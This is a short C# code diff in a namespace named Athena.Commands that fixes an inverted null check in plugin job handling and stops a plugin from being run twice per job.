@@ -198,9 +198,9 @@ namespace Athena.Commands
                 default:
                     ResponseResult rr = (ResponseResult)await CheckAndRunPlugin(job);
                     
-                    if(rr is null)
+                    if(rr is not null)
                     {
-                        this.responseResults.Add(await CheckAndRunPlugin(job));
+                        this.responseResults.Add(rr);
                         this.activeJobs.Remove(task.id, out _);
                     }
                     break;
